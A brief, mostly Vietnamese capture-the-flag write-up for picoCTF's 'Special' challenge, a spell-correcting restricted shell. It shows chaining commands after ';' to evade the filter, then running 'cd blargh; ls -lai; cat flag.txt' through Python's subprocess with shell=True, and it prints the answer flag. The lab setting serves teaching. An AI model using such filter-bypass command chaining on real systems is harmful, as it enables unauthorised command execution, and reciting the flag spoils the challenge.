# **Special**
## **Challenge**
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
## **Writeup**
Ta thấy mỗi khi ấn lệnh gì đó chữ đầu tiên sẽ bị thay đổi nên ta có thể nhập 1 lệnh khác sau *;* để chạy được lệnh. Mình vô tình thấy có sẵn lệnh python3 trong máy nên mình đã viết script để chạy lệnh:
```

Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import subprocess
>>> command = input()
cd blargh; ls -lai; cat flag.txt
>>> print((subprocess.check_output(command, shell=True)).decode())
```

Và ra kết quả:
```
total 4
144914840 drwxr-xr-x 2 ctf-player ctf-player 22 Mar 16 02:10 .
 11467679 drwxr-xr-x 1 ctf-player ctf-player 20 Mar 30 16:34 ..
144914841 -rw-r--r-- 1 root       root       41 Mar 16 02:10 flag.txt
picoCTF{5p311ch3ck_15_7h3_w0r57_f906e25a}
```

Flag: `picoCTF{5p311ch3ck_15_7h3_w0r57_f906e25a}`
